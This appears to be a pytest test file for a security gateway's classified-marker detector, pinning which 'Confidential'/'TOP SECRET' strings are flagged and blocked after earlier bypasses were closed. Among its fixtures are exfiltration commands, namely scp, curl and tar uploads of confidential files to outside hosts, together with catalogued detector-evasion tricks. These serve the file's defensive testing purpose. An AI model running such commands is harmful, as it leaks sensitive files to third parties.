"""2.9.21 英文 Confidential 误拦：试过只给代码标识符、枚举取值开窄例外，复查收口后已整段删除，判法与 2.9.20 完全相同。

现场：CodeBuddy 模型回答里首字母大写的 "Confidential" 被内置策略「涉密文件标记检测」
（classified_classified_en，high，默认 block）在输出侧整条拦掉。

第一轮把英文规则整体改成“必须在标记位置才算”，审查（B5–B16）发现大量真实标记跟着放行。第二至四轮改成只给
成员访问（Level.Confidential）、引号字面量（level = "Confidential"）、级别并列列表（enum Visibility
{ Public, Internal, Confidential }）三处开窄例外，并逐轮收紧。第四轮复查仍有成立的绕过，三个分支都被利用：
- 总闸的中文文档名词只有报告、合同等，资料、文档、表格、档案漏列，三个分支的写法换成中文文档名后整条放行；
- 成员访问：NBSP、全角空格让“单词+空格”判断失效，Markdown 列表或引用前缀、“is: ”这类标点加空格绕过行首和
  链前判断，LaTeX 的 \\lfoot{ 被当成代码块；
- 引号字面量：XML 标签名是中文或下划线开头、前一个属性值里内嵌 <b>、标签起点超过 2000 字时判为不在标签内。
按事先定好的收口规则不再收窄，三个分支连同总闸、例外上限、告警复核里的上限一并删除，英文规则恢复 2.9.20。

2.9.21 另按方向收口：网关原生路径声明的模型输出里，中英文密级标记只留证（test_classified_output_observation_2921.py、
test_classified_output_policy_scope_2921.py）。本文件里 side=output 的用例不带声明，期望照 2.9.20；
side=native-output 的用例带网关原生声明（principal.entry_point=gateway_api、output_projection=model_text），
密级命中照旧出现，但不计入、不拦，其余命中照常处置。输入侧和 claude-code 输入侧的期望不变。

本文件钉住：
- 原先放开的代码写法（成员访问、字面量、级别列表）照 2.9.20 命中并拦截；
- 历轮审查、绕过复查的每条写法，结果与 2.9.20 完全相同（期望值在 release-2.9.20 上实测）；
- 标识符（ConfidentialData、is_confidential、CONFIDENTIAL_LEVEL、confidentialFlag）在 2.9.20 就因 \\b 不命中，
  只钉住；全大写、top secret、散文里的写法照 2.9.20 处理。
"""
import pytest

from app.detectors.data_leak import DataLeakDetector
from app.detectors.engine import SecurityEngine
from app.policy_bindings import CompiledPolicy, CompiledPolicyCapability, PolicySet
from app.principal_context import PrincipalContext

EN_RULE = "data_leak_classified_en"
CN_RULE = "data_leak_classified_cn"
CLASSIFIED = {"classified_classified_cn", "classified_classified_en"}
det = DataLeakDetector()


def _en_hits(text):
    return [f for f in det.detect(text) if f["rule_id"] == EN_RULE]


def _builtin_classified_policy():
    # 与控制面内置「涉密文件标记检测」一致：high + block，中英两项能力，输入输出两侧。
    return CompiledPolicy(
        policy_code="builtin.data_leak.17723b156cfa7533", policy_id="policy-classified",
        policy_name="涉密文件标记检测", policy_type="data_leak", scene="data_security",
        severity="high", action="block", enabled=True, binding_mode="any",
        capabilities=[CompiledPolicyCapability(
            category=category, supported_stages=["input", "output"],
            allowed_actions=["audit", "block"], mask_capable=False,
        ) for category in sorted(CLASSIFIED)],
    )


@pytest.fixture(scope="module")
def engine():
    eng = SecurityEngine()
    eng.load_policies(PolicySet([_builtin_classified_policy()]))
    return eng


def _assert_action(result, side, action, label=None):
    """输入侧、不带声明的输出侧照 2.9.20 的处置；网关原生声明的输出侧，密级命中只留证（2.9.21）。"""
    hits = [f for f in result.findings if f.category in CLASSIFIED]
    if side == "native-output" and hits:
        assert all(f.counts_as_security_finding is False for f in hits), label
        assert all(f.triage.get("disposition_reason") == "model_output_classified_marker" for f in hits), label
        # 只绑了内置密级策略：其余计入的命中没有策略，按检测器结果记 audit；没有其余命中时放行。
        others = [f for f in result.findings if f.category not in CLASSIFIED and f.counts_as_security_finding]
        assert result.action == ("audit" if others else "allow"), (label, [(f.category, f.action) for f in others])
        return
    assert result.action == action, label


def _gateway_principal():
    return PrincipalContext(
        schema_version=1, tenant_id="tenant_default", key_id="key-r2921", protocol="openai",
        entry_point="gateway_api", identity_source="api_key", trust_level="key_bound",
    )


def _run(engine, side, text):
    if side == "input":
        return engine.check_input("r2921-conf", text, skip_semantic=True, content_source="user")
    if side == "native-output":
        return engine.check_output("r2921-conf", text, context={"output_projection": "model_text"},
                                   skip_semantic=True, principal=_gateway_principal())
    return engine.check_output("r2921-conf", text, skip_semantic=True)


# ——2.9.20 就不命中的标识符写法（\b 挡在匹配之外），钉住；原先放开的代码写法已移到 BACK_TO_2920——
RELEASED = {
    "class_name": "class ConfidentialData: stores the file metadata",
    "field_name": "if doc.is_confidential: write the report file",
    "screaming_snake_identifier": "CONFIDENTIAL_LEVEL = 3  # used by the file exporter",
    "camel_identifier": "if (doc.confidentialFlag) saveFile(doc);",
}

# ——第一轮放开、但不在本轮窄例外里的写法：恢复 2.9.20，照常命中并拦截——
BACK_TO_2920 = {
    "cn_answer_enum_value": "这里的 Confidential 只是枚举值，表示文件的保密级别。",
    "cn_answer_changed_default": "已在 config.ts 中把 level 默认值改成 Confidential，修改了 2 个文件。",
    "cn_answer_http_field": "Confidential 字段在 HTTP 协议的响应头里返回。",
    "cn_answer_db_column": "Confidential 列存在数据库里。",
    "sentence_adjective": "This value is confidential to the user, so do not write it to the log file.",
    "yaml_bool_key": "在 settings.yaml 文件里加一行：\nconfidential: true\n",
    "ts_type_annotation": "  confidential: boolean;  // saved with the file record",
    "kebab_cli_flag": "Pass --confidential-mode when uploading the file.",
    "classified_by_model": "The upload was classified by the model as spam; see the report file.",
    "lowercase_internal_use_comment": "def sync():\n    # internal use only, see the design document\n    return 1",
    "documentation_key": "documentation: confidential mode toggles the profile page",
    "level_union_type": "Literal type (Public | Confidential) is stored in the file.",
    "python_type_hint": "confidential: bool = False  # stored in the file",
    "cpp_namespace": "confidential::Level lvl;  // loaded from the file",
    "markdown_level_table": "| Level | Meaning |\n| Confidential | 仅项目成员可见的文件 |",
    "prose_private_and_confidential": "I'll keep your files private and confidential.",
    "corroboration_substring_only": "CONFIDENTIAL banner styles live in the user profile; see the Dockerfile and documentation.",
    # 第二轮放开、第三轮收窄后不在例外里的 6 条：恢复 2.9.20，照常命中并拦截
    "member_access_enum": "把默认可见性设为 Visibility.Confidential，再更新 profile 文件即可。",  # 后接中文逗号
    "member_access_lowercase": "document.querySelectorAll('.confidential') marks each file row",  # 点号左边是引号
    "rust_scope_enum": "match level { Sensitivity::Confidential => write_file(path), _ => {} }",  # :: 左边是密级键名
    "http_header_value": 'res.setHeader("X-Data-Level", "Confidential"); then stream the file.',  # 引号前只有逗号
    "bullet_enum_list": "Levels written to the file:\n- Public\n- Internal\n- Confidential\n",  # 一项一行
    "numbered_level_list": "文件可见级别：\n1. Public\n2. Internal\n3. Confidential\n",  # 一项一行
    # 第三轮放开、第四轮（r2921d）收窄后不在例外里的 6 条：恢复 2.9.20，照常命中并拦截
    "member_access_sentence_comma": "Set the default to Level.Confidential, then save the report file.",  # 链前是英文单词+空格；逗号后接正文且无代码信号；行内有 report
    "member_access_lower_chain": "if doc.levels.confidential == 1: save the report file",  # 行内有 report
    "bracket_enum_list": "可选值为 [Public, Internal, Confidential]，写在配置文件里。",  # 光有方括号、“可选值”不算枚举语境
    "level_list_first_item": "可选值：(Confidential, Internal, Public)，写在配置文件里。",  # 同上
    "slash_level_list": "Level options: Public / Internal / Confidential (stored in the file)",  # options: 冒号说明式不认
    "cn_dunhao_level_list": "级别取值：Public、Internal、Confidential，写在配置文件里。",  # 取值：不认
    # 第二至四轮放开、第四轮复查后删除例外分支的 19 条（原 RELEASED）：恢复 2.9.20，照常命中并拦截
    "member_access_call_arg": "doc.setLevel(Level.Confidential)  // persist to the output file",
    "member_access_backticks": "把默认值设为 `Level.Confidential`，修改了 2 个文件。",
    "member_access_if_colon": "if doc.level == Level.Confidential:\n    save_file(doc)",
    "member_access_case_colon": "case Level.Confidential:\n    save_file(doc)",
    "member_access_subscript": "limit = levels[Level.Confidential]  # file quota",
    "rust_scope_enum_arm": "match level { Level::Confidential => write_file(path), _ => {} }",
    "python_literal_assign": "level = 'confidential'  # stored in the file",
    "literal_assign_double": 'level = "Confidential"  # stored in the file',
    "literal_keyword_arg": 'save_file(path, level="Confidential")',
    "literal_equality": 'if doc.level == "Confidential":\n    save_file(doc)',
    "literal_elif_equality": 'elif doc.level == "Confidential":\n    save_file(doc)',
    "literal_case_line": 'case "Confidential":\n    save_file(doc)',
    "literal_switch_case": 'switch (doc.level) {\n  case "Confidential":\n    return saveFile(doc);\n}',
    "literal_return": 'return "Confidential"  # default level for new files',
    "literal_call_arg": 'doc.setLevel("Confidential")  // persist to the output file',
    "literal_union_levels": 'Literal["Public", "Internal", "Confidential"]  # file visibility',
    "brace_enum_list": "enum Visibility { Public, Internal, Confidential }  // used by the file uploader",
    "internal_use_in_union": "type Level = 'Public' | 'Internal Use' | 'Confidential'  // file visibility",
    "python_functional_enum": 'Level = Enum("Level", ["Public", "Internal", "Confidential"])  # file levels',
}

# ——紧挨着窄例外、但不满足条件的写法：照 2.9.20 命中并拦截——
NEAR_EXCEPTION = {
    "all_caps_level_list": "PUBLIC, INTERNAL, CONFIDENTIAL file levels",
    "top_secret_in_level_list": "Levels: Public, Secret, Top Secret (see the file)",
    "ellipsis_not_member_access": "Q3 board report draft...Confidential",
    "member_access_path_segment": "cp ./out/Level.Confidential/report.pdf /tmp",
    "member_access_file_extension": "Upload Board_Report.Confidential.pptx to the share",
    "quoted_after_marked": 'The memo is marked "Confidential", see the attached file.',
    "quoted_doc_subject_prose": 'This report is "Confidential" (see attached file).',
    "quoted_label_key": 'Sensitivity Label = "Confidential"  # board report file',
    "quoted_classification_key": '{"title": "Q3 board report", "dataClassification": "Confidential"}',
    "backtick_value_in_prose": "把 level 默认值改成 `Confidential`，修改了 2 个文件。",
    "level_list_one_other": "Levels written to the file: Public, Confidential",
    "level_list_with_gloss": "可选值：Public（公开）、Internal（内部）、Confidential（机密），见 models.py 文件。",
    "list_item_with_description": "文件级别：\n- Public: 所有人可见\n- Internal: 员工可见\n- Confidential: 仅项目成员可见的文件\n",
    "list_item_one_other": "Levels written to the file:\n- Public\n- Confidential\n",
}

# ——守护：真实的涉密标记写法，仍命中并按策略拦截——
GUARDED = {
    "all_caps_banner": "CONFIDENTIAL - Q3 board report draft",
    "all_caps_top_secret": "TOP SECRET//NOFORN operations report attached",
    "all_caps_classified": "CLASSIFIED personnel file for agent 7",
    "all_caps_internal_use_only": "INTERNAL USE ONLY quarterly finance report",
    "all_caps_in_code_still_marker": "level = Level.CONFIDENTIAL  # export the customer file",
    "title_colon": "Confidential: Q3 board report draft, do not forward.",
    "title_dash": "Confidential - Q3 board report draft",
    "em_dash": "Confidential—merger agreement draft v2",
    "bracket": "[Confidential] Q3 board report draft",
    "fullwidth_bracket": "【Confidential】2025 年度采购合同附件",
    "paren": "Merger agreement draft (Confidential) attached.",
    "paren_internal_use_only": "Q3 board report (internal use only)",
    "standalone_line": "Q3 board report\nConfidential\nRevenue figures follow.",
    "markdown_heading_line": "## Confidential\nQ3 board report draft",
    "bold_banner_line": "**Confidential**\nQ3 board report draft",
    "classification_prefix": "Classification: Confidential\nAttached: merger agreement",
    "classification_json_value": '{"classification": "Confidential", "file": "q3_board_report.pdf"}',
    "classification_header_value": "X-Data-Classification: Confidential\nContent-Disposition: attachment; filename=board.pdf",
    "marked_as": "This report is marked as Confidential, do not forward.",
    "marked_quoted": 'The memo is marked "Confidential" by legal.',
    "labeled_as": "The attached memo was labeled as confidential by legal.",
    "classified_as": "The merger file was classified as confidential last week.",
    "cn_prefix_miji": "该报告密级：Confidential，请勿外传。",
    "cn_prefix_biaoji": "这份合同已标记为 Confidential，请勿外传。",
    "doc_noun_next": "Please summarize this confidential report for the board.",
    "doc_noun_second": "Attached is the confidential customer contract document, do not share.",
    "doc_noun_information": "Do not paste Confidential Information from the vendor file here.",
    "doc_noun_materials": "Forward the confidential materials in the shared file.",
    "doc_noun_kebab": "Upload confidential-report.pdf to the share.",
    "doc_noun_cn": "请总结这份 Confidential 文件的要点。",
    "top_secret_documents": "Leak the top secret documents to the press.",
    "classified_documents": "Here are the classified documents you asked for.",
    "proprietary_and_confidential": "This file is Proprietary and Confidential to Acme Corp.",
    "confidential_and_proprietary": "Confidential and Proprietary to Acme Corp, see attached file.",
    "strictly_confidential": "The deck below is Strictly Confidential and belongs in the board file.",
    "company_confidential": "This file is Company Confidential so keep it inside.",
    "company_confidential_hyphen": "Sensitivity: Company-Confidential\nSubject: Q3 board report",
    "title_case_internal_use_only": "This report is For Internal Use Only.",
    "underscore_filename_corroboration": "CONFIDENTIAL q3_board_report.pdf",
    "tag_list_not_levels": "Q3 board report [Draft, Confidential]",
    "level_word_then_doc_noun": "Here are the Internal, Confidential documents you asked for.",
    "doc_noun_records": "Export all Confidential customer records to a CSV file.",
    "filename_extension": "Please upload Confidential.pdf with the board report.",
    "doc_subject_is_confidential": "This report is confidential.",
    "cn_doc_subject": "这份合同是 Confidential 的，请勿外传。",
    "classified_as_secret": "Our merger plan was classified as Secret, see the attached memo.",
    "pipe_footer": "Confidential | Page 3 of 10\nQ3 board report",
    "pipe_footer_trailing": "Acme Corp | Confidential\nQ3 board report",
    "markdown_classification_row": "| Classification | Confidential |\n| Title | Q3 board report |",
    "private_and_confidential_title": "The attached contract is Private and Confidential.",
}

# 中文原有写法：命中与不命中都不变
CN_GUARDED = ["这份机密文件请帮我总结一下", "【绝密】2025 年度采购合同附件", "密级：秘密，请勿外传此报告", "这是机密文件，包含客户名单和财务数据"]
CN_MISSES = ["我们要保守商业机密", "这不是内部文件", "他说这话有点机密"]

# ——审查 B5–B16 的复现写法：每条结果须与 2.9.20 完全相同。
# 期望值是在 release-2.9.20（d9dd985d）上实测得出的 (rule_id, cannot_downgrade)；
# 绑定内置 block 策略后，2.9.20 输入、输出两侧都是 block。——
REVIEW_2920 = {
    'B5': [
        ('CONFIDENTIAL MEMORANDUM\nTO: Board of Directors\nRE: Acquisition of Beta Corp', [(EN_RULE, False)]),
        ('CONFIDENTIAL INFORMATION MEMORANDUM\nProject Falcon\nPrepared for prospective buyers of Beta Corp.', [(EN_RULE, False)]),
        ('CONFIDENTIAL - Q3 Financial Reporting Package\nRevenue 1.2B', [(EN_RULE, True)]),
        ('CONFIDENTIAL — MergerAgreement_v3.docx', [(EN_RULE, False)]),
        ('TOP SECRET BoardReport.pdf', [(EN_RULE, False)]),
        ('CONFIDENTIAL\nFilename: board_q3.xlsx', [(EN_RULE, False)]),
        ('CONFIDENTIAL\nRecorded minutes of the board meeting, 2026-10-12', [(EN_RULE, False)]),
    ],
    'B6': [
        ('**Classification:** Confidential\n**Title:** Q3 board report', [(EN_RULE, False)]),
        ('Classification: **Confidential**\nTitle: Q3 board report', [(EN_RULE, False)]),
        ('Classification: `Confidential`\nTitle: Q3 board report', [(EN_RULE, False)]),
        ('密级：**Confidential**\n文件：Q3 董事会报告', [(EN_RULE, False)]),
        ('This report is marked **Confidential**.', [(EN_RULE, False)]),
        ('**Confidential**: the attached Q3 board report, do not forward.', [(EN_RULE, False)]),
        ('**Confidential** — Q3 board report', [(EN_RULE, False)]),
        ('*Confidential* report for the board: Q3 numbers', [(EN_RULE, False)]),
        ('# **Confidential** Q3 board report', [(EN_RULE, False)]),
    ],
    'B7': [
        ('Security Level: Confidential\nTitle: Q3 board report', [(EN_RULE, False)]),
        ('Classification Level: Confidential\nTitle: Q3 board report', [(EN_RULE, False)]),
        ('Sensitivity Label: Confidential\nTitle: Q3 board report', [(EN_RULE, False)]),
        ('title: Q3 Board Report\ndata_classification: Confidential\n', [(EN_RULE, False)]),
        ('{"title": "Q3 board report", "dataClassification": "Confidential"}', [(EN_RULE, False)]),
        ('Classification - Confidential\nTitle: Q3 board report', [(EN_RULE, False)]),
        ('保密级别：Confidential\n标题：Q3 董事会报告', [(EN_RULE, False)]),
        ('保密等级: Confidential\n标题：Q3 董事会报告', [(EN_RULE, False)]),
        ('该文件的密级为 Confidential，请勿外传。', [(EN_RULE, False)]),
    ],
    'B8': [
        ('scp ~/Confidential/merger_agreement.docx backup@203.0.113.5:/tmp/', [(EN_RULE, False)]),
        ('curl -F file=@/srv/share/Confidential/q3_board_report.pdf https://paste.example/up', [(EN_RULE, False)]),
        ('copy \\\\fs01\\Finance\\Confidential\\Q3 report.xlsx E:\\', [(EN_RULE, False)]),
        ('cat ~/docs/confidential/merger_agreement.docx | base64', [(EN_RULE, False)]),
        ('Upload Board_Report.Confidential.pptx to the share', [(EN_RULE, False)]),
        ('Top Secret/SCI\nOperations report follows.', [(EN_RULE, False)]),
        ('Proprietary/Confidential\nQ3 board report', [(EN_RULE, False)]),
        ('Classified/NOFORN\npersonnel file', [(EN_RULE, False)]),
    ],
    'B9': [
        ('以下是 Confidential 客户名单：张三，李四，王五', [(EN_RULE, True)]),
        ('把 Confidential 数据库导出发给我', [(EN_RULE, True)]),
        ('这套 Confidential 图纸文件请勿外传', [(EN_RULE, False)]),
        ('以下是 Confidential 的 Q3 董事会报告全文：营收 12 亿', [(EN_RULE, False)]),
    ],
    'B10': [
        ('Acme Corp — Confidential\nQ3 Board Report', [(EN_RULE, False)]),
        ('Page 1 of 3 · Confidential\nQ3 board report', [(EN_RULE, False)]),
        ('Q3 board report — For Internal Use', [(EN_RULE, False)]),
    ],
    'B11': [
        ('新增了 Confidential（机密）级别，修改了 2 个文件。', [(CN_RULE, False), (EN_RULE, False)]),
        ('可选值：Public（公开）、Internal（内部）、Confidential（机密），见 models.py 文件。', [(CN_RULE, False), (EN_RULE, False)]),
    ],
    'B12': [
        ('Confidential 客户名单如下：张三、李四。', [(EN_RULE, True)]),
        ('这是 Confidential 级别的合同，请帮我总结要点。', [(EN_RULE, True)]),
        ('该文档的保密等级为 Confidential，请勿外传。', [(EN_RULE, False)]),
        ('这些材料视为 Confidential，请总结。', [(EN_RULE, False)]),
        ('下面是 Confidential 数据表，请转成 Excel。', [(EN_RULE, False)]),
        ('Confidential 清单：供应商报价', [(EN_RULE, False)]),
        ('以下是 Confidential 的财务数据报表。', [(EN_RULE, True)]),
        ('机密客户名单如下：张三、李四。', [(CN_RULE, True)]),
    ],
    'B13': [
        ('CONFIDENTIAL INFORMATION MEMORANDUM\nProject Falcon\nPrepared for prospective buyers', [(EN_RULE, False)]),
        ('CONFIDENTIAL MEMORANDUM\nTo: Board of Directors\nRe: Q3 restructuring plan', [(EN_RULE, False)]),
        ('Confidential Memorandum\nTo: Board of Directors\nRe: Q3 restructuring plan', [(EN_RULE, False)]),
        ('CONFIDENTIAL\nFilename: board_q3_numbers.xlsx\nOwner: finance', [(EN_RULE, False)]),
        ('TOP SECRET - Contractor payment schedule for 2027', [(EN_RULE, False)]),
    ],
    'B14': [
        ('Security Level: Confidential\nAttached: Q3 board report', [(EN_RULE, False)]),
        ('Classification Level: Confidential\nQ3 board report attached', [(EN_RULE, False)]),
        ('Sensitivity Level: Confidential\nQ3 board report attached', [(EN_RULE, False)]),
        ('Protective Marking: Confidential\nQ3 board report attached', [(EN_RULE, False)]),
        ('Security Level: Internal Use\nQ3 board report attached', [(EN_RULE, False)]),
        ('Classification: Confidential\nAttached: merger agreement', [(EN_RULE, False)]),
    ],
    'B15': [
        ('Q3 board report\n...\nHuawei Confidential\nPage 3 of 12', [(EN_RULE, False)]),
        ('Revenue forecast attached in the report.\nAcme Corp Confidential', [(EN_RULE, False)]),
        ('© 2026 Acme Inc. Confidential.\nQ3 board report', [(EN_RULE, False)]),
        ('Subject: Confidential\n\nPlease find attached the Q3 report.', [(EN_RULE, False)]),
        ('Acme Corp | Confidential\nQ3 board report', [(EN_RULE, False)]),
    ],
    'B16': [
        ('Confidential / Do not forward\nQ3 board report attached', [(EN_RULE, False)]),
        ('Attorney-Client Privileged / Confidential\nsee attached contract', [(EN_RULE, False)]),
        ('Confidential (Draft)\nQ3 board report', [(EN_RULE, False)]),
        ('Confidential | Restricted Distribution\nQ3 board report', [(EN_RULE, False)]),
        ('Confidential | Page 3 of 10\nQ3 board report', [(EN_RULE, False)]),
    ],
}


def _classified_findings(text):
    return [(f["rule_id"], bool(f["triage"].get("cannot_downgrade")))
            for f in det.detect(text) if f["rule_id"] in (EN_RULE, CN_RULE)]


def test_guards_outnumber_releases():
    assert len(GUARDED) >= len(RELEASED)


@pytest.mark.parametrize("name", sorted(RELEASED))
def test_code_identifier_not_flagged(name):
    assert _en_hits(RELEASED[name]) == []


@pytest.mark.parametrize("side", ["input", "output", "native-output"])
@pytest.mark.parametrize("name", sorted(RELEASED))
def test_code_identifier_not_blocked_by_builtin_policy(engine, name, side):
    result = _run(engine, side, RELEASED[name])
    assert not CLASSIFIED & {f.category for f in result.findings}
    assert result.action != "block", [(f.category, f.action) for f in result.findings]


@pytest.mark.parametrize("name", sorted(BACK_TO_2920) + sorted(NEAR_EXCEPTION) + sorted(GUARDED))
def test_english_marker_still_flagged(name):
    text = {**BACK_TO_2920, **NEAR_EXCEPTION, **GUARDED}[name]
    hits = _en_hits(text)
    assert hits, name
    assert hits[0]["severity"] == "high"
    assert hits[0]["confidence"] >= 0.85


@pytest.mark.parametrize("side", ["input", "output", "native-output"])
@pytest.mark.parametrize("name", sorted(BACK_TO_2920) + sorted(NEAR_EXCEPTION) + sorted(GUARDED))
def test_english_marker_still_blocked_by_builtin_policy(engine, name, side):
    text = {**BACK_TO_2920, **NEAR_EXCEPTION, **GUARDED}[name]
    result = _run(engine, side, text)
    assert "classified_classified_en" in {f.category for f in result.findings}
    _assert_action(result, side, "block", name)


@pytest.mark.parametrize("bid", sorted(REVIEW_2920, key=lambda b: int(b[1:])))
def test_review_case_detector_result_same_as_2920(bid):
    for text, expected in REVIEW_2920[bid]:
        assert _classified_findings(text) == expected, (bid, text)


@pytest.mark.parametrize("side", ["input", "output", "native-output"])
@pytest.mark.parametrize("bid", sorted(REVIEW_2920, key=lambda b: int(b[1:])))
def test_review_case_engine_result_same_as_2920(engine, bid, side):
    for text, expected in REVIEW_2920[bid]:
        result = _run(engine, side, text)
        expected_categories = {rule_id.replace("data_leak_", "classified_") for rule_id, _ in expected}
        assert CLASSIFIED & {f.category for f in result.findings} == expected_categories, (bid, text)
        _assert_action(result, side, "block", (bid, text))


@pytest.mark.parametrize("side", ["input", "output", "native-output"])
@pytest.mark.parametrize("text", CN_GUARDED)
def test_chinese_marker_unchanged_and_blocked(engine, text, side):
    result = _run(engine, side, text)
    assert "classified_classified_cn" in {f.category for f in result.findings}
    _assert_action(result, side, "block", text)


@pytest.mark.parametrize("text", CN_MISSES)
def test_chinese_ordinary_usage_unchanged(text):
    assert not [f for f in det.detect(text) if f["rule_id"] == "data_leak_classified_cn"]


def test_negated_english_marker_still_not_flagged():
    assert _en_hits("This report is not confidential, share the file freely.") == []


def test_code_value_before_real_marker_does_not_hide_it():
    # 第四轮收紧：前面的代码值 80 字内就有 report/draft，不再例外，照 2.9.20 第一处就命中
    text = "Set doc.setLevel(Visibility.Confidential) in the file.\n\nCONFIDENTIAL\nQ3 board report draft"
    hits = _en_hits(text)
    assert hits and hits[0]["raw_evidence"] == "Confidential"
    assert hits[0]["matched_location"].startswith("content[28:")


def test_code_value_before_title_case_marker_does_not_hide_it():
    # 第四轮收紧：同上，前面的代码值照 2.9.20 命中
    text = "Set doc.setLevel(Visibility.Confidential) in the file.\n\nConfidential: Q3 board report draft"
    hits = _en_hits(text)
    assert hits and hits[0]["matched_location"].startswith("content[28:")


_FAR_FILLER = "x = 1\n" * 20


def test_far_code_value_before_real_marker_does_not_hide_it():
    # 第五轮（复查收口）：例外已删除，前面的代码值离得再远也照 2.9.20 命中（第一处就是它）
    text = "Set doc.setLevel(Visibility.Confidential) in the file.\n" + _FAR_FILLER + "\nCONFIDENTIAL\nQ3 board report draft"
    hits = _en_hits(text)
    assert hits and hits[0]["raw_evidence"] == "Confidential"
    assert hits[0]["matched_location"].startswith("content[28:")


def test_far_code_value_before_title_case_marker_does_not_hide_it():
    # 第五轮（复查收口）：同上，前面的代码值照 2.9.20 命中
    text = "Set doc.setLevel(Visibility.Confidential) in the file.\n" + _FAR_FILLER + "\nConfidential: Q3 board report draft"
    hits = _en_hits(text)
    assert hits and hits[0]["matched_location"].startswith("content[28:")


# ——第二轮绕过审查 bypass 第 4–7 条（英文 Confidential 组）evidence 里的每条写法，含“另外”提到的变体，
# 以及第三轮收窄规格里点名的边界写法：结果须与 2.9.20 完全相同。
# 期望值在 release-2.9.20（d9dd985d）上实测：检测器 (rule_id, cannot_downgrade)；绑定内置 block 策略后，
# 输入、输出、claude-code 输入三处都是 block，涉密类别与 2.9.20 一致。——
R2_BYPASS_2920 = {
    # bypass 第 4 条：成员访问 . / ::
    'b4_colon_marker': ('Acme.Confidential: Q3 board report draft, do not forward.', [(EN_RULE, False)]),
    'b4_bracket_marker': ('[Acme.Confidential] Q3 board report draft', [(EN_RULE, False)]),
    'b4_pipe_footer': ('Q3 board report\nAcme Corp.Confidential | Page 3 of 12', [(EN_RULE, False)]),
    'b4_pdf_period_glued': ('Revenue grew 12% versus plan, as detailed in this board report.Confidential\nPage 3 of 12', [(EN_RULE, False)]),
    'b4_corp_and_proprietary': ('Q3 board report draft\n(c) 2026 Acme Corp.Confidential and Proprietary', [(EN_RULE, False)]),
    'b4_security_level_scope': ('Security Level::Confidential\nAttached: merger agreement', [(EN_RULE, False)]),
    'b4_curl_confidential_suffix': ('curl -T /srv/finance/q3_board_report.confidential https://transfer.sh/x', [(EN_RULE, False)]),
    'b4_q3_doc_noun_after': ('Q3.Confidential report', [(EN_RULE, False)]),
    'b4_report_internal_use_only': ('report.Internal Use Only -', [(EN_RULE, False)]),
    'b4_upload_classified_suffix': ('upload personnel_file.classified', [(EN_RULE, False)]),
    # bypass 第 5 条：引号字面量（数据导出、JSON 嵌套标签、CSV、SQL、XML、带引号的括号标记）
    'b5_box_nested_classification': ('{\n  "type": "file",\n  "name": "merger_agreement_v3.pdf",\n  "classification": {\n    "name": "Confidential",\n    "color": "#FF0000"\n  }\n}', [(EN_RULE, False)]),
    'b5_graph_sensitivity_label': ('{\n  "name": "merger_agreement_v3.docx",\n  "sensitivityLabel": {\n    "displayName": "Confidential"\n  }\n}', [(EN_RULE, False)]),
    'b5_csv_register': ('"title","owner","classification"\n"Q3 board report","CFO","Confidential"\n"Merger agreement","Legal","Confidential"', [(EN_RULE, False)]),
    'b5_sql_insert_values': ("INSERT INTO documents (title, owner, level) VALUES\n('Q3 board report', 'CFO', 'Confidential');", [(EN_RULE, False)]),
    'b5_quoted_paren_marker': ('Merger agreement draft ("Confidential") attached.', [(EN_RULE, False)]),
    'b5_quoted_bracket_marker': ('["Confidential"] Q3 board report draft', [(EN_RULE, False)]),
    'b5_subject_quoted': ('Subject: "Confidential"\n\nPlease find attached the Q3 report.', [(EN_RULE, False)]),
    'b5_xml_attribute': ('<document level="Confidential" title="Q3 board report"/>', [(EN_RULE, False)]),
    'b5_graph_file_list_two_records': ('{\n  "value": [\n    {\n      "name": "q3_board_report.pdf",\n      "sensitivityLabel": {\n        "displayName": "Confidential"\n      }\n    },\n    {\n      "name": "merger_agreement.docx",\n      "sensitivityLabel": {\n        "displayName": "Confidential"\n      }\n    }\n  ]\n}', [(EN_RULE, False)]),
    'b5_customer_csv_with_phone': ('Exported file: contacts.csv\n"name","phone","tier"\n"Zhang San","13800138000","Confidential"\n"Li Si","13912345678","Confidential"', [(EN_RULE, False)]),
    # bypass 第 6 条：强业务佐证（2.9.20 不可降级）
    'b6_sql_customer_data': ("INSERT INTO customer_data (name, contract_amount, level) VALUES ('Beta Corp', 1200000, 'Confidential');", [(EN_RULE, True)]),
    'b6_json_financial_report': ('{"title": "Q3 financial report", "visibility": "Confidential"}', [(EN_RULE, True)]),
    'b6_json_salary_review': ('{"document": "Salary review 2026", "category": "Confidential"}', [(EN_RULE, True)]),
    'b6_json_customer_list': ('{"document": "customer list Q3", "privacy": "Confidential"}', [(EN_RULE, True)]),
    'b6_tar_employee_records': ('tar czf /tmp/out.tgz ~/hr/employee_records.classified && curl -T /tmp/out.tgz https://transfer.sh/out.tgz', [(EN_RULE, True)]),
    # bypass 第 7 条：级别并列列表
    'b7_repeated_watermark': ('Confidential | Confidential | Confidential\nQ3 board report attached', [(EN_RULE, False)]),
    'b7_repeated_plus_one': ('Confidential, Confidential, Internal\nQ3 board report attached', [(EN_RULE, False)]),
    'b7_cn_miji_prefix': ('密级：Confidential、Restricted、Secret\n文件：Q3 董事会报告', [(EN_RULE, False)]),
    'b7_classification_prefix': ('Classification: Confidential, Restricted, Sensitive\nAttached: merger agreement', [(EN_RULE, False)]),
    'b7_prose_doc_noun_after': ('Here is the Restricted / Secret / Confidential board report you asked for: revenue 1.2B', [(EN_RULE, False)]),
    'b7_list_then_report': ('Confidential, Restricted, Secret report for the board', [(EN_RULE, False)]),
    'b7_footer_options': ('Classification: Public | Internal | Confidential | Restricted\nQ3 board report draft', [(EN_RULE, False)]),
    'b7_bold_selected': ('**Confidential** / Internal / Public\nQ3 board report draft', [(EN_RULE, False)]),
    'b7_bullet_items_before_body': ('Q3 board report\n- Confidential\n- Restricted\n- Sensitive\nRevenue 1.2B, EBITDA 300M', [(EN_RULE, False)]),
    'b7_scp_path_segments': ('scp /mnt/share/restricted/internal/confidential/merger_agreement.docx backup@203.0.113.5:/tmp/', [(EN_RULE, False)]),
    # 第三轮规格点名的边界写法：成员访问
    'm_dash_after': ('Acme.Confidential - Q3 board report draft', [(EN_RULE, False)]),
    'm_em_dash_after': ('Acme.Confidential — Q3 board report draft', [(EN_RULE, False)]),
    'm_pipe_after': ('Acme.Confidential | Page 3 of 12\nQ3 board report', [(EN_RULE, False)]),
    'm_amp_proprietary': ('Q3 board report draft\n(c) 2026 Acme.Confidential & Proprietary', [(EN_RULE, False)]),
    'm_space_text_after': ('Set Visibility.Confidential in the file.', [(EN_RULE, False)]),
    'm_url_after': ('curl -T Docs.Confidential https://transfer.sh/x  # board report', [(EN_RULE, False)]),
